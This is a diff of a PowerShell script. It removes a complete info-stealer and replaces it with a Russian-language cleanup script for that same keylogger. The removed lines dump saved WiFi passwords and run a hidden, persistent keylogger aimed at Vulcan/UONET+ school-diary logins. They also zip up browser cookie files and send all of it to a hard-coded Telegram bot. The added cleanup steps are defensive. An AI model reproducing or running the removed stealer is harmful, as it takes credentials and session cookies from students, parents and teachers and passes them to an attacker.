@@ -1,360 +1,200 @@
-# Основной сбор данных
-$sys = Get-CimInstance Win32_ComputerSystem
-$os = Get-CimInstance Win32_OperatingSystem
-$cpu = Get-CimInstance Win32_Processor
-$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
-$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
-$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
+# cleanup_keylogger.ps1 - Полное удаление кейлоггера Vulcan
 
-# Сеть и WiFi
-try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
-$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress
+Write-Host "=== ОЧИСТКА СИСТЕМЫ ОТ КЕЙЛОГГЕРА ===" -ForegroundColor Red
 
-$wifi = ""
-try {
-    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-        $name = $_.ToString().Split(":")[1].Trim()
-        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
-        $wifi += "$name : $pass`n"
+# 1. ОСТАНОВКА ПРОЦЕССОВ КЕЙЛОГГЕРА
+Write-Host "`n[1] Остановка процессов кейлоггера..." -ForegroundColor Yellow
+
+# Поиск и завершение процессов кейлоггера
+$processes = Get-WmiObject Win32_Process | Where-Object { 
+    $_.CommandLine -like "*vulcan_logger*" -or 
+    $_.CommandLine -like "*SystemMonitor*" -or
+    $_.CommandLine -like "*proxy_guard*" -or
+    $_.CommandLine -like "*WindowsUpdateService*"
+}
+
+if ($processes) {
+    foreach ($process in $processes) {
+        try {
+            Write-Host "   Завершение процесса: $($process.ProcessId) - $($process.Name)"
+            $process.Terminate() | Out-Null
+            Start-Sleep -Milliseconds 500
+        } catch {
+            Write-Host "   Ошибка завершения процесса $($process.ProcessId): $($_.Exception.Message)" -ForegroundColor Red
+        }
     }
-    if (!$wifi) {$wifi = "No WiFi networks"}
-} catch {$wifi = "WiFi error"}
+    Write-Host "   ✓ Процессы кейлоггера остановлены" -ForegroundColor Green
+} else {
+    Write-Host "   ✓ Активных процессов кейлоггера не найдено" -ForegroundColor Green
+}
 
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
-$keyloggerStatus = "Starting..."
+# Дополнительная проверка через Get-Process
+Get-Process | Where-Object { 
+    $_.ProcessName -eq "powershell" -and 
+    $_.MainWindowTitle -eq "" -and 
+    $_.StartInfo.Arguments -like "*vulcan_logger*"
+} | ForEach-Object {
+    try {
+        Write-Host "   Завершение скрытого PowerShell: $($_.Id)"
+        $_.Kill()
+    } catch {}
+}
 
-# Создаем улучшенный кейлоггер
-$keyloggerScript = @"
-Add-Type -AssemblyName System.Windows.Forms
+# 2. УДАЛЕНИЕ АВТОЗАГРУЗКИ ИЗ РЕЕСТРА
+Write-Host "`n[2] Удаление автозагрузки из реестра..." -ForegroundColor Yellow
 
-# Список целевых сайтов Вулкан
-`$vulcanUrls = @(
-    "*vulcan*",
-    "*uonetplus*", 
-    "*dziennik*",
-    "*edu.gdynia*",
-    "*eszkola.opolskie.pl*",
-    "*cufs.vulcan.net.pl*",
-    "*dziennik-logowanie.vulcan.net.pl*",
-    "*Account/LogOn*"
+$registryPaths = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
 )
 
-`$capturedData = @()
-`$currentWindow = ""
-`$buffer = ""
-`$isVulcanSite = `$false
-`$loginField = `$false
-`$passwordField = `$false
-`$loginData = ""
-`$passwordData = ""
-
-function Send-ToTelegram {
-    param(`$message)
-    try {
-        `$body = @{
-            chat_id = '5674514050'
-            text = `$message
-        }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
-    } catch { }
-}
-
-function Process-Buffer {
-    if(`$buffer -ne "") {
-        # Определяем тип данных по контексту
-        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
-            `$loginData = `$buffer
-            Send-ToTelegram "🔑 VULCAN LOGIN: `$loginData"
-        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
-            `$passwordData = `$buffer
-            Send-ToTelegram "🔒 VULCAN PASSWORD: `$passwordData"
-            
-            # Если есть и логин и пароль - отправляем вместе
-            if(`$loginData -ne "" -and `$passwordData -ne "") {
-                Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$loginData`nPassword: `$passwordData"
-                `$loginData = ""
-                `$passwordData = ""
-            }
-        } else {
-            # Отправляем обычные данные
-            Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
-        }
-        
-        `$capturedData += `$buffer
-        `$buffer = ""
-    }
-}
-
-while(`$true) {
-    try {
-        # Получаем активное окно
-        `$activeWindow = ""
-        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
-        if(`$processes) {
-            `$activeWindow = `$processes[0].MainWindowTitle
-        }
-        
-        # Проверяем активное окно на наличие сайтов Вулкан
-        `$siteDetected = `$false
-        foreach(`$url in `$vulcanUrls) {
-            if(`$activeWindow -like `$url) {
-                `$siteDetected = `$true
-                break
-            }
-        }
-        
-        if(`$siteDetected) {
-            if(!`$isVulcanSite) {
-                `$isVulcanSite = `$true
-                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`n`$activeWindow"
-            }
-        } else {
-            if(`$isVulcanSite) {
-                `$isVulcanSite = `$false
-                Process-Buffer
-                Send-ToTelegram "📱 USER LEFT VULCAN SITE"
-            }
-        }
-        
-        # Перехватываем нажатия клавиш только на сайтах Вулкан
-        if(`$isVulcanSite) {
-            for(`$i = 8; `$i -lt 255; `$i++) {
-                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-                if(`$keyState -eq -32767) {
-                    `$key = [System.Windows.Forms.Keys]`$i
-                    
-                    # Обрабатываем специальные клавиши
-                    switch(`$key) {
-                        "Enter" { 
-                            Process-Buffer
-                        }
-                        "Space" { 
-                            `$buffer += " " 
-                        }
-                        "Back" { 
-                            if(`$buffer.Length -gt 0) { 
-                                `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
-                            }
-                        }
-                        "Tab" { 
-                            `$buffer += "[TAB]"
-                            Process-Buffer
-                        }
-                        "LButton" { 
-                            # Клик мыши - обрабатываем буфер
-                            Process-Buffer
-                        }
-                        "RButton" { 
-                            # Правый клик - обрабатываем буфер
-                            Process-Buffer
-                        }
-                        default {
-                            # Обрабатываем обычные символы
-                            if(`$key -ge 65 -and `$key -le 90) {
-                                # Буквы A-Z
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
-                                
-                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                                    `$buffer += `$key.ToString()
-                                } else {
-                                    `$buffer += `$key.ToString().ToLower()
-                                }
-                            } elseif(`$key -ge 48 -and `$key -le 57) {
-                                # Цифры 0-9
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                                if(`$isShift) {
-                                    `$buffer += `$symbols[`$key - 48]
-                                } else {
-                                    `$buffer += (`$key - 48).ToString()
-                                }
-                            } elseif(`$key -eq 190 -or `$key -eq 110) {
-                                # Точка
-                                `$buffer += "."
-                            } elseif(`$key -eq 189 -or `$key -eq 109) {
-                                # Минус/дефис
-                                `$buffer += "-"
-                            } elseif(`$key -eq 187 -or `$key -eq 107) {
-                                # Плюс/равно
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "+"
-                                } else {
-                                    `$buffer += "="
-                                }
-                            }
-                        }
-                    }
-                    
-                    # Автоматически отправляем длинные вводы
-                    if(`$buffer.Length -gt 50) {
-                        Process-Buffer
-                    }
-                }
-            }
-        }
-    } catch { }
-    Start-Sleep -Milliseconds 5
-}
-"@
-
-# Сохраняем и запускаем улучшенный кейлоггер
-try {
-    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger.ps1" -Encoding ASCII
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`"" -WindowStyle Hidden
-    
-    # Добавляем в автозагрузку
-    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
-    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
-    
-    $keyloggerStatus = "✅ Advanced keylogger active - monitoring Vulcan sites"
-} catch {
-    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
-}
-
-# Безопасность
-try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
-try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
-try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}
-
-# Cookies - создаем ZIP архив для удобной загрузки
-$cookies = @()
-$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
-$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"
-
-New-Item -ItemType Directory -Path $temp -Force | Out-Null
-
-# Копируем файлы cookies
-$browsers = @(
-    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
-    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
-    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
+$keysToRemove = @(
+    "SystemMonitor",
+    "WindowsUpdateService", 
+    "ProxyGuard",
+    "VulcanLogger"
 )
 
-foreach ($browser in $browsers) {
-    if ($browser.Path -and (Test-Path $browser.Path)) {
-        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
-        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
-        if (Test-Path $dest) {
-            $cookies += $dest
-            # Создаем текстовую информацию о файле
-            $fileInfo = Get-Item $dest
-            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
-            $cookies += "$temp\$($browser.Name)_info.txt"
+foreach ($regPath in $registryPaths) {
+    if (Test-Path $regPath) {
+        foreach ($key in $keysToRemove) {
+            try {
+                Remove-ItemProperty -Path $regPath -Name $key -ErrorAction SilentlyContinue
+                Write-Host "   ✓ Удален ключ: $key" -ForegroundColor Green
+            } catch {
+                Write-Host "   Ключ не найден: $key" -ForegroundColor Gray
+            }
         }
     }
 }
 
-# Создаем ZIP архив с cookies
-try {
-    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
-        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
-        if (Test-Path $zipPath) {
-            $cookies += $zipPath
-        }
-    }
-} catch {}
+# 3. УДАЛЕНИЕ ФАЙЛОВ КЕЙЛОГГЕРА
+Write-Host "`n[3] Удаление файлов кейлоггера..." -ForegroundColor Yellow
 
-# Дополнительная информация
-try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
-try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
-try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}
+$filesToRemove = @(
+    "$env:TEMP\vulcan_logger.ps1",
+    "$env:TEMP\proxy_guard.ps1",
+    "$env:TEMP\Cookies_*.zip",
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vulcan_logger.*",
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemMonitor.*"
+)
 
-# Формирование и отправка сообщения
-$msg = @"
-=== SYSTEM INFORMATION ===
-User: $env:USERNAME
-Computer: $env:COMPUTERNAME
-Domain: $env:USERDOMAIN
-
-=== HARDWARE INFORMATION ===
-Processor: $($cpu.Name)
-RAM: $ram GB
-GPU: $gpu
-Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB
-
-=== OPERATING SYSTEM ===
-OS: $($os.Caption)
-Version: $($os.Version)
-Build: $($os.BuildNumber)
-
-=== NETWORK INFORMATION ===
-Public IP: $ip
-
-Network Interfaces:
-$($net | ForEach-Object { 
-    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
-    "- $name : $($_.IPAddress)" 
-} | Out-String)
-
-Active Connections:
-$conn
-
-=== WIFI PASSWORDS ===
-$wifi
-
-=== KEYLOGGER STATUS ===
-$keyloggerStatus
-
-=== TARGET SITES ===
-• https://cufs.vulcan.net.pl/minrol/Account/LogOn
-• Все сайты Vulcan/UONET+
-• Страницы входа в дневник
-
-=== BROWSER COOKIES ===
-Found cookies files: $($cookies.Count)
-Files available for download as ZIP archive
-
-=== SECURITY STATUS ===
-Firewall: 
-$fw
-Windows Defender: $defStatus
-RDP Access: $rdp
-
-=== INSTALLED SOFTWARE ===
-$software
-
-=== SYSTEM UPTIME ===
-Uptime: $uptimeInfo
-"@
-
-Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
-
-# Отправка ZIP архива с cookies
-if (Test-Path $zipPath) {
+foreach ($file in $filesToRemove) {
     try {
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-            chat_id = '5674514050'
-            document = [System.IO.File]::OpenRead($zipPath)
-            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
+        if (Test-Path $file) {
+            Remove-Item -Path $file -Force -ErrorAction Stop
+            Write-Host "   ✓ Удален файл: $(Split-Path $file -Leaf)" -ForegroundColor Green
         }
     } catch {
-        # Если не удалось отправить ZIP, отправляем файлы по отдельности
-        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
-            try {
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-                    chat_id = '5674514050'
-                    document = [System.IO.File]::OpenRead($_)
-                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
-                }
-            } catch {}
-        }
-    }
-} else {
-    # Отправка отдельных файлов если ZIP не создался
-    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
-        try {
-            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
-                chat_id = '5674514050'
-                document = [System.IO.File]::OpenRead($_)
-                caption = "Cookies file: $(Split-Path $_ -Leaf)"
-            }
-        } catch {}
+        Write-Host "   Ошибка удаления $file : $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-# Очистка
-Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+# Удаление временных папок cookies
+Get-ChildItem "$env:TEMP" -Directory | Where-Object Name -like "Cookies_*" | ForEach-Object {
+    try {
+        Remove-Item $_.FullName -Recurse -Force -ErrorAction Stop
+        Write-Host "   ✓ Удалена папка: $($_.Name)" -ForegroundColor Green
+    } catch {
+        Write-Host "   Ошибка удаления папки $($_.Name)" -ForegroundColor Red
+    }
+}
+
+# 4. ВОССТАНОВЛЕНИЕ НАСТРОЕК ПРОКСИ
+Write-Host "`n[4] Восстановление настроек сети..." -ForegroundColor Yellow
+
+try {
+    # Отключение прокси в Internet Settings
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -ErrorAction SilentlyContinue
+    
+    Write-Host "   ✓ Настройки прокси восстановлены" -ForegroundColor Green
+} catch {
+    Write-Host "   Ошибка восстановления настроек прокси" -ForegroundColor Red
+}
+
+# 5. ОЧИСТКА НАСТРОЕК БРАУЗЕРОВ
+Write-Host "`n[5] Очистка настроек браузеров..." -ForegroundColor Yellow
+
+$browserPaths = @(
+    "HKCU:\Software\Google\Chrome",
+    "HKCU:\Software\Microsoft\Edge", 
+    "HKCU:\Software\Mozilla\Firefox"
+)
+
+$browserKeys = @("ProxyMode", "ProxyServer", "ProxyEnable")
+
+foreach ($browserPath in $browserPaths) {
+    if (Test-Path $browserPath) {
+        foreach ($key in $browserKeys) {
+            try {
+                Remove-ItemProperty -Path $browserPath -Name $key -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        Write-Host "   ✓ Очищены настройки: $(Split-Path $browserPath -Leaf)" -ForegroundColor Green
+    }
+}
+
+# 6. ПРОВЕРКА ОСТАТОЧНЫХ СЛЕДОВ
+Write-Host "`n[6] Проверка остаточных следов..." -ForegroundColor Yellow
+
+# Проверка процессов
+$remainingProcesses = Get-WmiObject Win32_Process | Where-Object { 
+    $_.CommandLine -like "*vulcan_logger*" -or 
+    $_.CommandLine -like "*SystemMonitor*"
+}
+
+if ($remainingProcesses) {
+    Write-Host "   ⚠ Обнаружены остаточные процессы:" -ForegroundColor Yellow
+    $remainingProcesses | ForEach-Object { 
+        Write-Host "      - $($_.ProcessId): $($_.Name)" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "   ✓ Остаточных процессов не найдено" -ForegroundColor Green
+}
+
+# Проверка автозагрузки
+$remainingKeys = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue |
+    Get-Member -MemberType NoteProperty | 
+    Where-Object { $_.Name -in $keysToRemove }
+
+if ($remainingKeys) {
+    Write-Host "   ⚠ Обнаружены остаточные ключи автозагрузки:" -ForegroundColor Yellow
+    $remainingKeys | ForEach-Object { Write-Host "      - $($_.Name)" -ForegroundColor Yellow }
+} else {
+    Write-Host "   ✓ Остаточных ключей автозагрузки не найдено" -ForegroundColor Green
+}
+
+# 7. ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ПРОВОДНИКА
+Write-Host "`n[7] Перезагрузка проводника Windows..." -ForegroundColor Yellow
+
+try {
+    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
+    Start-Sleep 2
+    Start-Process "explorer.exe"
+    Write-Host "   ✓ Проводник перезагружен" -ForegroundColor Green
+} catch {
+    Write-Host "   ⚠ Не удалось перезагрузить проводник" -ForegroundColor Yellow
+}
+
+# ИТОГОВОЕ СООБЩЕНИЕ
+Write-Host "`n" + "="*50 -ForegroundColor Green
+Write-Host "ОЧИСТКА ЗАВЕРШЕНА!" -ForegroundColor Green
+Write-Host "="*50 -ForegroundColor Green
+
+Write-Host "`nРекомендуемые действия:" -ForegroundColor Cyan
+Write-Host "1. Перезагрузите компьютер для полной очистки" -ForegroundColor White
+Write-Host "2. Проверьте настройки сети в Панели управления" -ForegroundColor White  
+Write-Host "3. Проверьте автозагрузку в Диспетчере задач" -ForegroundColor White
+Write-Host "4. Сканируйте систему антивирусом" -ForegroundColor White
+
+Write-Host "`nДля полной гарантии выполните перезагрузку компьютера!" -ForegroundColor Yellow
+
+# Запрос на перезагрузку
+$reboot = Read-Host "`nВыполнить перезагрузку сейчас? (y/n)"
+if ($reboot -eq 'y' -or $reboot -eq 'Y') {
+    Write-Host "Перезагрузка через 5 секунд..." -ForegroundColor Yellow
+    Start-Sleep 5
+    Restart-Computer -Force
+}
